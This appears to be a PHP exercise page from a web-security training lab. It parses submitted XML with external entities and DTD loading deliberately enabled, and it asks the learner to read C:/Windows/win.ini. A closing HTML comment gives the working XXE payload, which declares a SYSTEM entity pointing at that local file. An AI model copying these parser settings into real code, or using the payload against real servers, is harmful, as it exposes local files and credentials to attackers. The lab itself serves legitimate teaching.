<?php
require_once '../global.php';
require_once '../header.php';

echo "<h5><u>* Misson: Read the content of the following file 'C:/Windows/win.ini'.</u></h5>";


if (isset($_POST['xmldata'])){
	$xmlValue = $_POST['xmldata'];
	libxml_disable_entity_loader (false); 
	$xmlfile = $xmlValue; 
	$dom = new DOMDocument(); 
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
	$creds = simplexml_import_dom($dom); 
	$user = $creds->user; 
	echo "Welcome $user!!";
}


?>

<form action="" method="POST">
Enter XML data:<br>
	<textarea rows="8" cols="60" name="xmldata">
<creds>
	<user>SuperHacker</user>
</creds></textarea>
<br>
  <input type="submit" value="Submit">
</form>

<?php
require_once '../footer.php';
?>

<!--
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" >]>
<creds>
    <user>&xxe;</user>
</creds>
-->